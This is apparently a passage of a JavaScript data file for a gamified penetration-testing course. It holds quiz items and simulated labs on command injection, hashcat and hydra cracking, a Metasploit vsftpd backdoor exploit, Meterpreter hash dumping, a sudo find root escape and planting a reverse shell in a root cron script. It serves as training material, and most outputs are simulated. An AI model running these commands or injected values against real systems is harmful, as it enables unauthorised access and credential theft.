{id:â€œu9mâ€,title:â€\uD83C\uDFC6 Web Attacks Masteryâ€,isCheckpoint:true,rounds:[
{type:â€œpickâ€,q:â€œStored XSS is dangerous because:â€,opts:[â€œAffects all users who view the pageâ€,â€œOnly works onceâ€,â€œRequires a special linkâ€,â€œCrashes the serverâ€],a:â€œAffects all users who view the pageâ€,why:â€œStored XSS persists and triggers for everyone.â€},
{type:â€œtypeâ€,q:â€œInject a command alongside ping:â€,a:[â€œ127.0.0.1; cat /etc/passwdâ€,â€| cat /etc/passwdâ€],why:â€; chains commands.â€},
{type:â€œscenarioâ€,situation:â€œYou find user input reflected in a pageâ€™s HTML source code.â€,q:â€œWhat do you test?â€,opts:[â€œXSSâ€,â€œSQL injectionâ€,â€œSSRFâ€,â€œBrute forceâ€],a:â€œXSSâ€,why:â€œInput in HTML without sanitization = XSS opportunity.â€},
]},
]},

// â€“â€“ UNIT 10: PASSWORD CRACKING â€“â€“
{id:â€œu10â€,title:â€œPassword Crackingâ€,desc:â€œBreak hashes and brute-force loginsâ€,levels:[
{id:â€œu10l1â€,title:â€œHow Hashes Workâ€,rounds:[
{type:â€œteachâ€,text:â€œWebsites donâ€™t store your actual password \u2014 they scramble it into a hash. â€˜passwordâ€™ becomes â€˜5f4dcc3bâ€¦cf99â€™. You canâ€™t reverse it, but you CAN hash every word in a dictionary and compare.â€},
{type:â€œpickâ€,q:â€œWhy canâ€™t you reverse a hash back to the original password?â€,opts:[â€œHashing is a one-way processâ€,â€œThe password gets deletedâ€,â€œItâ€™s encrypted with a keyâ€,â€œThe algorithm is secretâ€],a:â€œHashing is a one-way processâ€,why:â€œHashing destroys information. You can only guess passwords, scramble them, and compare.â€},
{type:â€œteachâ€,text:â€œCommon hash types: MD5 = 32 characters long (old and weak, cracks fast). SHA-256 = 64 characters (stronger). bcrypt = starts with $2b$ (very slow to crack, used by modern sites). NTLM = used by Windows computers.â€},
]},
{id:â€œu10l2â€,title:â€œCracking Toolsâ€,rounds:[
{type:â€œteachâ€,text:â€œhashcat cracks millions of hashes per second on your GPU. rockyou.txt has 14 million real leaked passwords. hydra attacks live login pages over SSH, FTP, and HTTP.â€},
{type:â€œhackâ€,story:â€œYou dumped a database and found the CEOâ€™s password hash: 5f4dcc3b5aa765d61d8327deb882cf99. Itâ€™s MD5 (32 characters). Time to crack it with hashcat and the famous rockyou.txt wordlist.â€,q:â€œCrack this MD5 hash.â€,a:[â€œhashcat -m 0 hash.txt rockyou.txtâ€,â€œhashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txtâ€,â€œjohn hash.txt â€“wordlist=rockyou.txtâ€],output:â€œhashcat v6.2.6 startingâ€¦\n\nDictionary: rockyou.txt (14,344,391 words)\nSpeed: 4,231,000 H/s\n\n5f4dcc3b5aa765d61d8327deb882cf99:password\n\nSession completed. 1/1 hash cracked.\n\n\uD83D\uDEA8 CEOâ€™s password is literally â€˜passwordâ€™â€,success:â€œCracked in 0.3 seconds! The CEO uses â€˜passwordâ€™ as their password. You canâ€™t make this up.â€,why:â€-m 0 = MD5 mode. hashcat tries every word in rockyou.txt against the hash at millions per second.â€,quickCmds:[â€œhashcat -m 0 hash.txt rockyou.txtâ€]},
{type:â€œhackâ€,story:â€œThe hash is cracked but you also found an SSH port open (22). The sysadmin username is â€˜jreevesâ€™. Try to brute-force the SSH login.â€,q:â€œBrute-force SSH for user jreeves.â€,a:[â€œhydra -l jreeves -P rockyou.txt 10.10.10.5 sshâ€,â€œhydra -l jreeves -P rockyou.txt target sshâ€,â€œhydra -l admin -P rockyou.txt 10.10.10.5 sshâ€],output:â€œHydra v9.4 startingâ€¦\n\n[22][ssh] host: 10.10.10.5\n  login: jreeves\n  password: sunshine1\n\n1 of 1 target completed, 1 valid password found\n\n\uD83D\uDD11 SSH credentials: jreeves:sunshine1â€,success:â€œSSH password cracked! You now have remote shell access to the server.â€,why:â€œhydra tests passwords from a wordlist against live services like SSH, FTP, and HTTP logins.â€,quickCmds:[â€œhydra -l jreeves -P rockyou.txt 10.10.10.5 sshâ€]},
]},
{id:â€œu10l3â€,title:â€œCracking Strategyâ€,rounds:[
{type:â€œteachâ€,text:â€œStart with common wordlists (rockyou). Then try rules (append numbers, capitalize). Then try masks (patterns like ?u?l?l?l?d?d). Last resort: pure brute force (slow).â€},
{type:â€œorderâ€,q:â€œPassword cracking priority:â€,items:[â€œWordlist attack (rockyou)â€,â€œRule-based mutationsâ€,â€œMask/pattern attackâ€,â€œPure brute forceâ€],why:â€œStart fast (wordlists), escalate to slow (brute force).â€},
{type:â€œpickâ€,q:â€œWhat is rockyou.txt?â€,opts:[â€œ14M leaked passwordsâ€,â€œA hacking toolâ€,â€œA hash algorithmâ€,â€œA password managerâ€],a:â€œ14M leaked passwordsâ€,why:â€œrockyou.txt is the standard cracking wordlist.â€},
]},
{id:â€œu10labâ€,title:â€\uD83D\uDDA5\uFE0F Lab: Crack the Hashesâ€,rounds:[
{type:â€œlabâ€,title:â€œCrack the Hashesâ€,objective:â€œCrack password hashes found in the database dump.â€,banner:â€œHashes from db_dump.sql:\nadmin:5f4dcc3b5aa765d61d8327deb882cf99\njsmith:e99a18c428cb38d5f260853678922e03\nâ€,steps:[
{hint:â€œIdentify the hash type (32 characters = ?).â€,accept:[â€œ~md5â€,â€œ~MD5â€,â€œmd5â€,â€œhash-identifierâ€],output:â€œ32 character hex string = MD5\nhashcat mode: -m 0â€,successMsg:â€œMD5 hashes! Fast to crack.â€,example:â€œmd5â€,quickCmds:[â€œmd5â€,â€œhash-identifierâ€]},
{hint:â€œCrack the hashes with hashcat.â€,accept:[â€œ~hashcatâ€,â€œhashcat -m 0 hash.txt rockyou.txtâ€],output:â€œ5f4dcc3bâ€¦  : password\ne99a18c4â€¦  : abc123\n\n2/2 hashes cracked!â€,successMsg:â€œCracked! admin:password, jsmith:abc123. Weak passwords.â€,example:â€œhashcat -m 0 hash.txt rockyou.txtâ€,quickCmds:[â€œhashcat -m 0 hash.txt rockyou.txtâ€]},
{hint:â€œTry logging in with the cracked credentials via SSH.â€,accept:[â€œ~sshâ€,â€œssh admin@10.10.10.88â€,â€œssh jsmith@10.10.10.88â€],output:â€œadmin@10.10.10.88â€™s password: password\nWelcome to SecureBank Server\nadmin@securebank:~$â€,successMsg:â€œLogged in as admin! Weak password + exposed hash = full compromise.â€,example:â€œssh admin@10.10.10.88â€,quickCmds:[â€œssh admin@10.10.10.88â€]}
]}
]},
{id:â€œu10mâ€,title:â€\uD83C\uDFC6 Password Masteryâ€,isCheckpoint:true,rounds:[
{type:â€œpickâ€,q:â€œrockyou.txt is:â€,opts:[â€œA wordlist of 14M passwordsâ€,â€œA toolâ€,â€œA hash algorithmâ€,â€œA managerâ€],a:â€œA wordlist of 14M passwordsâ€,why:â€œThe standard cracking wordlist.â€},
{type:â€œtypeâ€,q:â€œCrack MD5 hashes:â€,a:[â€œhashcat -m 0 hash.txt rockyou.txtâ€,â€œhashcat -m 0 hashes.txt rockyou.txtâ€,â€œjohn hash.txt â€“wordlist=rockyou.txtâ€],why:â€-m 0 = MD5 mode.â€},
{type:â€œtypeâ€,q:â€œBrute-force SSH:â€,a:[â€œhydra -l admin -P rockyou.txt target sshâ€,â€œhydra -l admin -P rockyou.txt 10.10.10.5 sshâ€],why:â€œhydra tests passwords against live services.â€},
{type:â€œorderâ€,q:â€œCracking priority:â€,items:[â€œWordlistâ€,â€œRulesâ€,â€œMaskâ€,â€œBrute forceâ€],why:â€œStart fast, escalate to slow.â€},
]},
]},

// â€“â€“ UNIT 11: METASPLOIT â€“â€“
{id:â€œu11â€,title:â€œMetasploitâ€,desc:â€œExploits, payloads, and shellsâ€,levels:[
{id:â€œu11l1â€,title:â€œMetasploit Basicsâ€,rounds:[
{type:â€œteachâ€,text:â€œMetasploit is your weapon vault \u2014 thousands of exploits ready to fire. Think of it like a robot locksmith with picks for every lock ever made. Workflow: search \u2192 use \u2192 set target \u2192 fire.â€},
{type:â€œhackâ€,story:â€œA vulnerable FTP server is running vsftpd 2.3.4 \u2014 a version with a famous backdoor. Fire up Metasploit and find the exploit.â€,q:â€œLaunch the Metasploit console.â€,a:[â€œmsfconsoleâ€],output:â€     ,           ,\n    /             \\n   ((**â€”,,,â€”**))\n      (*) O O (*)\n         \ _ /     msf6 >\n          |_|\n\n   =[ metasploit v6.3.40 ]\n   + â€“ â€“=[ 2345 exploits - 1220 payloads ]\n   + â€“ â€“=[ 1100 auxiliary - 399 post ]\n\nmsf6 >â€,success:â€œMetasploit loaded with 2,345 exploits ready to go!â€,why:â€œmsfconsole launches the Metasploit Framework console.â€},
{type:â€œorderâ€,q:â€œMetasploit workflow:â€,items:[â€œsearch for exploitâ€,â€œuse the moduleâ€,â€œset RHOSTS (target)â€,â€œset LHOST (your IP)â€,â€œexploitâ€],why:â€œThis workflow applies to every single Metasploit exploit.â€},
]},
{id:â€œu11l2â€,title:â€œMeterpreterâ€,rounds:[
{type:â€œteachâ€,text:â€œMeterpreter is your spy inside the target. Upload files, take screenshots, log keystrokes, dump ALL password hashes, migrate between processes, and pivot to other machines. Itâ€™s the ultimate post-exploitation tool.â€},
{type:â€œhackâ€,story:â€œYouâ€™ve exploited a Windows server and have a Meterpreter session. The client wants proof you can access sensitive data. Dump the password hashes.â€,q:â€œExtract all password hashes from the system.â€,a:[â€œhashdumpâ€,â€œrun hashdumpâ€],output:â€œmeterpreter > hashdump\n\nAdministrator:500:aad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::\nGuest:501:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\ncfo_williams:1001:aad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::\nit_admin:1002:aad3b435b51404ee:7a21990fcd3d759941e45c490f143d5f:::\ndb_service:1003:aad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::\n\n5 hashes dumped.â€,success:â€œ5 accounts including the CFO and IT admin! These hashes can be cracked offline with hashcat.â€,why:â€œhashdump extracts NTLM password hashes from the SAM database. Works on Windows systems.â€},
{type:â€œpickâ€,q:â€œMeterpreter can:â€,opts:[â€œAll of these \u2014 itâ€™s a full toolkitâ€,â€œOnly execute commandsâ€,â€œOnly upload filesâ€,â€œOnly take screenshotsâ€],a:â€œAll of these \u2014 itâ€™s a full toolkitâ€,why:â€œMeterpreter handles files, screenshots, keylogging, hashes, pivoting, and more.â€},
]},
{id:â€œu11l3â€,title:â€œPost-Exploitationâ€,rounds:[
{type:â€œteachâ€,text:â€œAfter getting in: sysinfo (system info), getuid (who am I), getsystem (try to get SYSTEM on Windows), shell (drop to normal shell), persistence (survive reboots).â€},
{type:â€œscenarioâ€,situation:â€œYouâ€™ve got a meterpreter session on a Windows target. getuid shows youâ€™re a normal user, not admin.â€,q:â€œWhat do you try first?â€,opts:[â€œgetsystem to escalate privilegesâ€,â€œhashdump for passwordsâ€,â€œDelete logsâ€,â€œDisconnectâ€],a:â€œgetsystem to escalate privilegesâ€,why:â€œgetsystem tries several techniques to get SYSTEM (admin) privileges on Windows.â€},
{type:â€œtypeâ€,q:â€œGet system info in meterpreter:â€,a:[â€œsysinfoâ€,â€œsysteminfoâ€],why:â€œsysinfo shows OS, hostname, and architecture.â€},
]},
{id:â€œu11labâ€,title:â€\uD83D\uDDA5\uFE0F Lab: Metasploit Attackâ€,rounds:[
{type:â€œlabâ€,title:â€œMetasploit Attackâ€,objective:â€œUse Metasploit to exploit and take over a vulnerable server.â€,banner:â€œTarget: 10.10.10.99 running vsftpd 2.3.4\nKnown vulnerable version.\nâ€,steps:[
{hint:â€œStart Metasploit and search for the vsftpd exploit.â€,accept:[â€œ~search vsftpdâ€,â€œ~msfconsoleâ€,â€œsearch vsftpdâ€],output:â€œexploit/unix/ftp/vsftpd_234_backdoor  excellent  VSFTPD v2.3.4 Backdoorâ€,successMsg:â€œFound it! A known backdoor in this FTP version.â€,example:â€œsearch vsftpdâ€,quickCmds:[â€œsearch vsftpdâ€]},
{hint:â€œUse the exploit and set the target.â€,accept:[â€œ~use exploitâ€,â€œuse exploit/unix/ftp/vsftpd_234_backdoorâ€,â€œ~set RHOSTSâ€],output:â€œModule loaded.\nRHOSTS => 10.10.10.99â€,successMsg:â€œExploit ready, target set!â€,example:â€œuse exploit/unix/ftp/vsftpd_234_backdoorâ€,quickCmds:[â€œuse exploit/unix/ftp/vsftpd_234_backdoorâ€]},
{hint:â€œRun the exploit!â€,accept:[â€œexploitâ€,â€œrunâ€,â€œ~exploitâ€],output:â€[*] Sending triggerâ€¦\n[*] Command shell session 1 opened\n# whoami\nrootâ€,successMsg:â€œROOT shell! The vsftpd backdoor gives instant root access. Game over.â€,example:â€œexploitâ€,quickCmds:[â€œexploitâ€]}
]}
]},
{id:â€œu11mâ€,title:â€\uD83C\uDFC6 Metasploit Masteryâ€,isCheckpoint:true,rounds:[
{type:â€œtypeâ€,q:â€œStart Metasploit:â€,a:[â€œmsfconsoleâ€,â€œmsfâ€,â€œmsf6â€],why:â€œThe Metasploit console.â€},
{type:â€œorderâ€,q:â€œMetasploit workflow:â€,items:[â€œsearchâ€,â€œuse moduleâ€,â€œset RHOSTSâ€,â€œset LHOSTâ€,â€œexploitâ€],why:â€œStandard exploitation workflow.â€},
{type:â€œtypeâ€,q:â€œDump hashes:â€,a:[â€œhashdumpâ€,â€œrun hashdumpâ€],why:â€œExtract credentials.â€},
{type:â€œpickâ€,q:â€œMeterpreterâ€™s getsystem does:â€,opts:[â€œTries to escalate to SYSTEMâ€,â€œShows system infoâ€,â€œCrashes the systemâ€,â€œDownloads filesâ€],a:â€œTries to escalate to SYSTEMâ€,why:â€œgetsystem attempts privilege escalation on Windows.â€},
]},
]},
]};

var SEC4 = {
id:â€œs4â€,title:â€œAdvanced & Bug Bountyâ€,tier:â€œbasicâ€,icon:â€\uD83D\uDE80â€,color:â€œvar(â€“purple)â€,
desc:â€œPrivilege escalation, pivoting, bug bounties, scriptingâ€,
units:[
// â€“â€“ UNIT 12: PRIVILEGE ESCALATION â€“â€“
{id:â€œu12â€,title:â€œPrivilege Escalationâ€,desc:â€œGo from nobody to rootâ€,levels:[
{id:â€œu12l1â€,title:â€œLinux Privesc Basicsâ€,rounds:[
{type:â€œteachâ€,text:â€œAfter breaking in youâ€™re a nobody. PrivEsc = promoting yourself to root. First checks: sudo -l (what can I run as root?), SUID files, kernel version. linpeas automates ALL these checks \u2014 run ./linpeas.sh and it highlights everything exploitable.â€},
{type:â€œtypeâ€,q:â€œCheck sudo privileges:â€,a:[â€œsudo -lâ€,â€œsudo -llâ€,â€œsudo â€“listâ€],why:â€œFirst privilege escalation check.â€},
{type:â€œtypeâ€,q:â€œRun automated privesc enumeration:â€,a:[â€./linpeas.shâ€,â€œbash linpeas.shâ€,â€œsh linpeas.shâ€],why:â€œLinPEAS checks everything: SUID, crons, configs, kernel.â€},
]},
{id:â€œu12l2â€,title:â€œCommon Vectorsâ€,rounds:[
{type:â€œteachâ€,text:â€œMisconfigured cron jobs (scheduled tasks running as root). World-writable scripts called by root. Credentials in config files. Kernel exploits for old versions.â€},
{type:â€œtfâ€,q:â€œIf sudo -l shows you can run /usr/bin/find as root, thatâ€™s a privesc path.â€,a:true,why:â€œfind can execute commands: sudo find . -exec /bin/sh \;â€},
{type:â€œscenarioâ€,situation:â€œLinPEAS shows a cron job runs /opt/backup.sh as root every 5 minutes, and you have write access to that file.â€,q:â€œWhat do you do?â€,opts:[â€œAdd a reverse shell to backup.shâ€,â€œDelete the fileâ€,â€œIgnore itâ€,â€œRun it manuallyâ€],a:â€œAdd a reverse shell to backup.shâ€,why:â€œIf root runs your script, your reverse shell connects back as root.â€},
]},
{id:â€œu12l3â€,title:â€œPivotingâ€,rounds:[
{type:â€œteachâ€,text:â€œPivoting = using a hacked machine to reach hidden internal machines. Like breaking into the mailroom to access internal hallways. Chisel creates encrypted tunnels.â€},
{type:â€œorderâ€,q:â€œChisel pivoting setup:â€,items:[â€œStart chisel server on your machineâ€,â€œUpload chisel to compromised hostâ€,â€œRun chisel client pointing to serverâ€,â€œAccess internal target through tunnelâ€],why:â€œServer on attacker, client on victim.â€},
{type:â€œteachâ€,text:â€œSSH tunnels work too: ssh -L 8888:internal:80 user@compromised. Now localhost:8888 reaches the internal serverâ€™s port 80 through the compromised host.â€},
]},
{id:â€œu12labâ€,title:â€\uD83D\uDDA5\uFE0F Lab: Root the Boxâ€,rounds:[
{type:â€œlabâ€,title:â€œRoot the Boxâ€,objective:â€œEscalate from www-data to root.â€,banner:â€œConnected as www-data@target\n$ whoami\nwww-data\nâ€,steps:[
{hint:â€œCheck sudo privileges.â€,accept:[â€œsudo -lâ€,â€œ~sudo -lâ€,â€œ~sudoâ€],output:â€œUser www-data may run:\n  (root) NOPASSWD: /usr/bin/findâ€,successMsg:â€œfind as root, no password!â€,example:â€œsudo -lâ€,quickCmds:[â€œsudo -lâ€]},
{hint:â€œFind SUID binaries too.â€,accept:[â€œfind / -perm -4000â€,â€œ~find / -permâ€],output:â€/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/find\n/usr/bin/python3â€,successMsg:â€œMultiple privesc paths!â€,example:â€œfind / -perm -4000 2>/dev/nullâ€,quickCmds:[â€œfind / -perm -4000 2>/dev/nullâ€]},
{hint:â€œUse sudo find to get root.â€,accept:[â€œsudo find . -exec /bin/sh \;â€,â€œ~sudo findâ€,â€œsudo find . -exec /bin/bash \;â€],output:â€# whoami\nrootâ€,successMsg:â€œROOT! Full privesc complete.â€,example:â€œsudo find . -exec /bin/sh \;â€,quickCmds:[â€œsudo find . -exec /bin/sh \;â€]},
{hint:â€œGrab the flag.â€,accept:[â€œcat /root/root.txtâ€,â€œ~cat /root/rootâ€],output:â€œFLAG{pr1v_3sc_v1a_sud0_f1nd}â€,successMsg:â€œFLAG CAPTURED!â€,example:â€œcat /root/root.txtâ€,quickCmds:[â€œcat /root/root.txtâ€]}
]}
]},
{id:â€œu12mâ€,title:â€\uD83C\uDFC6 Privesc Masteryâ€,isCheckpoint:true,rounds:[
{type:â€œtypeâ€,q:â€œCheck sudo privileges:â€,a:[â€œsudo -lâ€,â€œsudo -llâ€,â€œsudo â€“listâ€],why:â€œFirst privesc check.â€},
{type:â€œtypeâ€,q:â€œFind SUID binaries:â€,a:[â€œfind / -perm -4000â€,â€œfind / -perm -4000 2>/dev/nullâ€],why:â€œSUID = potential privesc.â€},
{type:â€œtypeâ€,q:â€œRun LinPEAS:â€,a:[â€./linpeas.shâ€,â€œbash linpeas.shâ€],why:â€œAutomated enumeration.â€},
{type:â€œscenarioâ€,situation:â€œYou find a cron job running a world-writable script as root.â€,q:â€œWhat do you do?â€,opts:[â€œAdd a reverse shell to the scriptâ€,â€œDelete the cron jobâ€,â€œIgnore itâ€,â€œReport it and move onâ€],a:â€œAdd a reverse shell to the scriptâ€,why:â€œRoot will execute your code on the next cron cycle.â€},
]},
]},

// â€“â€“ UNIT 13: BUG BOUNTY â€“â€“
{id:â€œu13â€,title:â€œBug Bountyâ€,desc:â€œFind real bugs, get paidâ€,levels:[
{id:â€œu13l1â€,title:â€œMethodologyâ€,rounds:[
{type:â€œteachâ€,text:â€œBug bounty plan: 1) Read scope. 2) Recon (subdomains, tech stack). 3) Map features. 4) Test inputs. 5) Chain bugs. 6) Write report, get paid.â€},
{type:â€œorderâ€,q:â€œBug bounty workflow:â€,items:[â€œRead program scopeâ€,â€œSubdomain enumerationâ€,â€œMap featuresâ€,â€œTest for vulnsâ€,â€œChain findingsâ€,â€œWrite reportâ€],why:â€œMethodology prevents missed findings.â€},
{type:â€œmatchâ€,q:â€œMatch severity to finding:â€,pairs:[[â€œCriticalâ€,â€œRemote Code Executionâ€],[â€œHighâ€,â€œStored XSSâ€],[â€œMediumâ€,â€œReflected XSSâ€],[â€œLowâ€,â€œMissing headersâ€]],why:â€œSeverity determines payout.â€},
]},
{id:â€œu13l2â€,title:â€œRecon Automationâ€,rounds:[
{type:â€œteachâ€,text:â€œScale recon: subfinder finds subdomains, httpx checks which are alive, nuclei scans for known vulns. waybackurls pulls old URLs from the Internet Archive \u2014 pages the target deleted but the internet still remembers. Chain them all with pipes.â€},
{type:â€œbuildâ€,q:â€œBuild the recon chain:â€,parts:[â€œsubfinder -d target.comâ€,â€|â€,â€œhttpxâ€,â€|â€,â€œnucleiâ€],answer:[â€œsubfinder -d target.comâ€,â€|â€,â€œhttpxâ€,â€|â€,â€œnucleiâ€],why:â€œAutomates entire external recon.â€},
{type:â€œtypeâ€,q:â€œFind old URLs for a target:â€,a:[â€œwaybackurls target.comâ€,â€œgau target.comâ€],why:â€œHistorical URLs reveal forgotten endpoints.â€},
]},
{id:â€œu13l3â€,title:â€œWriting Reportsâ€,rounds:[
{type:â€œteachâ€,text:â€œGood report: Title + Severity, Description, Steps to Reproduce (exact!), Impact, Remediation. If they canâ€™t reproduce it, they canâ€™t pay you.â€},
{type:â€œorderâ€,q:â€œBug report sections:â€,items:[â€œTitle & Severityâ€,â€œDescriptionâ€,â€œSteps to Reproduceâ€,â€œImpactâ€,â€œRemediationâ€],why:â€œClear structure gets reports accepted.â€},
{type:â€œscenarioâ€,situation:â€œYou found a reflected XSS but the program says reflected XSS on unauthenticated pages is out of scope.â€,q:â€œWhat do you do?â€,opts:[â€œDonâ€™t report itâ€,â€œReport it anywayâ€,â€œPost it publiclyâ€,â€œChain it with another bugâ€],a:â€œDonâ€™t report itâ€,why:â€œRespect program rules. Out-of-scope reports waste time and can get you banned.â€},
]},
{id:â€œu13labâ€,title:â€\uD83D\uDDA5\uFE0F Lab: Bug Bounty Huntâ€,rounds:[
{type:â€œlabâ€,title:â€œBug Bounty Huntâ€,objective:â€œFind vulnerabilities in a bug bounty target.â€,banner:â€œProgram: MegaCorp Bug Bounty\nScope: *.megacorp.com\nReward: $500-$50,000\nâ€,steps:[
{hint:â€œStart with subdomain enumeration.â€,accept:[â€œsubfinder -d megacorp.comâ€,â€œ~subfinderâ€,â€œ~amassâ€],output:â€œmegacorp.com\nwww.megacorp.com\napi.megacorp.com\ndev.megacorp.com\nstaging.megacorp.com\nadmin.megacorp.comâ€,successMsg:â€œFound dev, staging, and admin subdomains!â€,example:â€œsubfinder -d megacorp.comâ€,quickCmds:[â€œsubfinder -d megacorp.comâ€]},
{hint:â€œCheck which subdomains are alive.â€,accept:[â€œ~httpxâ€,â€~| httpxâ€,â€œsubfinder -d megacorp.com | httpxâ€],output:â€œhttps://megacorp.com [200]\nhttps://api.megacorp.com [200]\nhttp://dev.megacorp.com [200]\nhttp://staging.megacorp.com [403]\nhttps://admin.megacorp.com [401]â€,successMsg:â€œdev is HTTP (not HTTPS) and staging returns 403!â€,example:â€œsubfinder -d megacorp.com | httpxâ€,quickCmds:[â€œsubfinder -d megacorp.com | httpxâ€]},
{hint:â€œScan the live targets for known vulnerabilities.â€,accept:[â€œ~nucleiâ€,â€œsubfinder -d megacorp.com | httpx | nucleiâ€],output:â€[critical] dev.megacorp.com - Git Config Exposed\n[high] api.megacorp.com - CORS Misconfiguration\n[info] admin.megacorp.com - Basic Authâ€,successMsg:â€œCritical: exposed .git on dev! That could leak source code. Write your report!â€,example:â€œsubfinder -d megacorp.com | httpx | nucleiâ€,quickCmds:[â€œsubfinder -d megacorp.com | httpx | nucleiâ€]}
]}
]},
{id:â€œu13mâ€,title:â€\uD83C\uDFC6 Bug Bounty Masteryâ€,isCheckpoint:true,rounds:[
{type:â€œbuildâ€,q:â€œRecon chain:â€,parts:[â€œsubfinder -d target.comâ€,â€|â€,â€œhttpxâ€,â€|â€,â€œnucleiâ€],answer:[â€œsubfinder -d target.comâ€,â€|â€,â€œhttpxâ€,â€|â€,â€œnucleiâ€],why:â€œStandard automated recon.â€},
{type:â€œtypeâ€,q:â€œFind historical URLs:â€,a:[â€œwaybackurls target.comâ€,â€œgau target.comâ€],why:â€œOld URLs = forgotten endpoints.â€},
{type:â€œorderâ€,q:â€œReport structure:â€,items:[â€œTitle & Severityâ€,â€œDescriptionâ€,â€œSteps to Reproduceâ€,â€œImpactâ€,â€œRemediationâ€],why:â€œClear structure gets accepted.â€},
{type:â€œpickâ€,q:â€œA critical finding:â€,opts:[â€œRemote Code Executionâ€,â€œMissing headersâ€,â€œVerbose errorsâ€,â€œSlow page loadâ€],a:â€œRemote Code Executionâ€,why:â€œRCE = critical severity.â€},
]},
]},

// â€“â€“ UNIT 14: SCRIPTING â€“â€“
{id:â€œu14â€,title:â€œScriptingâ€,desc:â€œAutomate with Bash and Pythonâ€,levels:[
{id:â€œu14l1â€,title:â€œBash Scriptingâ€,rounds:[
{type:â€œteachâ€,text:â€œBash scripts = text files with commands. Start with #!/bin/bash. chmod +x script.sh to make executable. Variables: target=â€˜10.10.10.5â€™. Use with $target. read ip asks the user to type something and stores it in a variable called ip.â€},
{type:â€œtypeâ€,q:â€œMake a script executable:â€,a:[â€œchmod +x script.shâ€,â€œchmod 755 script.shâ€,â€œchmod u+x script.shâ€],why:â€œScripts need execute permission.â€},
{type:â€œpickâ€,q:â€#!/bin/bash is called:â€,opts:[â€œA shebangâ€,â€œA commentâ€,â€œA variableâ€,â€œA functionâ€],a:â€œA shebangâ€,why:â€œThe shebang tells the system which interpreter to use.â€},
]},
{id:â€œu14l2â€,title:â€œPython Basicsâ€,rounds:[
{type:â€œteachâ€,text:â€œPython = #1 language for hacking tools. import socket for networking. import requests for HTTP. socket.connect_ex() returns 0 if a port is open.â€},
{type:â€œpickâ€,q:â€œsocket.connect_ex() returns 0 when:â€,opts:[â€œPort is openâ€,â€œPort is closedâ€,â€œTimeoutâ€,â€œDNS errorâ€],a:â€œPort is openâ€,why:â€œ0 = successful connection = open port.â€},
{type:â€œtfâ€,q:â€œThreading makes scans faster by checking multiple ports at once.â€,a:true,why:â€œ50 threads = 50 ports simultaneously.â€},
]},
{id:â€œu14l3â€,title:â€œBuilding Toolsâ€,rounds:[
{type:â€œteachâ€,text:â€œCombine bash for quick tasks (ping sweep, port check) and Python for complex tools (scanners, fuzzers, exploit scripts). Real pentesters write custom scripts daily.â€},
{type:â€œbuildâ€,q:â€œBuild a bash port check for port 80:â€,parts:[â€(echo > /dev/tcp/10.10.10.5/80)â€,â€œ2>/dev/nullâ€,â€&&â€,â€œecho â€˜Port 80 openâ€™â€],answer:[â€(echo > /dev/tcp/10.10.10.5/80)â€,â€œ2>/dev/nullâ€,â€&&â€,â€œecho â€˜Port 80 openâ€™â€],why:â€/dev/tcp tests connections. 2>/dev/null hides errors.â€},
{type:â€œtypeâ€,q:â€œStore user input in variable ip:â€,a:[â€œread ipâ€,â€œread -p â€™IP: â€™ ipâ€],why:â€œread stores user input in a variable.â€},
]},
{id:â€œu14labâ€,title:â€\uD83D\uDDA5\uFE0F Lab: Write a Scannerâ€,rounds:[
{type:â€œlabâ€,title:â€œWrite a Scannerâ€,objective:â€œWrite a quick port scanner in bash.â€,banner:â€œChallenge: Scan ports 22, 80, 443 on 10.10.10.5\nUsing bash /dev/tcp trick\nâ€,steps:[
{hint:â€œTest if port 22 is open.â€,accept:[â€~/dev/tcp/10.10.10.5/22â€,â€œ~echo > /dev/tcpâ€,â€(echo > /dev/tcp/10.10.10.5/22) 2>/dev/null && echo openâ€],output:â€œopenâ€,successMsg:â€œPort 22 is open! SSH is running.â€,example:â€(echo > /dev/tcp/10.10.10.5/22) 2>/dev/null && echo openâ€,quickCmds:[â€(echo > /dev/tcp/10.10.10.5/22) 2>/dev/null && echo openâ€]},
{hint:â€œTest port 80.â€,accept:[â€~/dev/tcp/10.10.10.5/80â€,â€(echo > /dev/tcp/10.10.10.5/80) 2>/dev/null && echo openâ€],output:â€œopenâ€,successMsg:â€œPort 80 open! Web server running.â€,example:â€(echo > /dev/tcp/10.10.10.5/80) 2>/dev/null && echo openâ€,quickCmds:[â€(echo > /dev/tcp/10.10.10.5/80) 2>/dev/null && echo openâ€]},
{hint:â€œNow scan all three at once with a for loop.â€,accept:[â€œ~for portâ€,â€œ~for pâ€,â€œfor port in 22 80 443; do (echo > /dev/tcp/10.10.10.5/$port) 2>/dev/null && echo "$port open"; doneâ€],output:â€œ22 open\n80 open\n443 openâ€,successMsg:â€œAll 3 ports open! You just wrote a port scanner in one line of bash.â€,example:â€œfor port in 22 80 443; do (echo > /dev/tcp/10.10.10.5/$port) 2>/dev/null && echo "$port open"; doneâ€,quickCmds:[â€œfor port in 22 80 443; do (echo > /dev/tcp/10.10.10.5/$port) 2>/dev/null && echo "$port open"; doneâ€]}
]}
]},
{id:â€œu14mâ€,title:â€\uD83C\uDFC6 Scripting Masteryâ€,isCheckpoint:true,rounds:[
{type:â€œtypeâ€,q:â€œMake script.sh executable:â€,a:[â€œchmod +x script.shâ€,â€œchmod 755 script.shâ€,â€œchmod u+x script.shâ€],why:â€œScripts need execute permission.â€},
{type:â€œpickâ€,q:â€#!/bin/bash is:â€,opts:[â€œA shebangâ€,â€œA commentâ€,â€œA variableâ€,â€œA functionâ€],a:â€œA shebangâ€,why:â€œTells the system to use bash.â€},
{type:â€œpickâ€,q:â€œPython socket.connect_ex() returns 0 when:â€,opts:[â€œPort openâ€,â€œPort closedâ€,â€œTimeoutâ€,â€œErrorâ€],a:â€œPort openâ€,why:â€œ0 = connection successful.â€},
{type:â€œtypeâ€,q:â€œStore user input:â€,a:[â€œread ipâ€,â€œread -p â€™IP: â€™ ipâ€],why:â€œread stores input in a variable.â€},
]},
]},
]};

// =============================================
// INTERMEDIATE SECTION (7 units, 35 levels)
// Same topics, harder. More labs, less hand-holding.
// Mix of MegaCorp + new targets.
// =============================================

var SEC5 = {
id:â€œs5â€,title:â€œTerminal & Linux IIâ€,tier:â€œintermediateâ€,icon:â€\uD83D\uDC27â€,color:â€œvar(â€“green)â€,
units:[
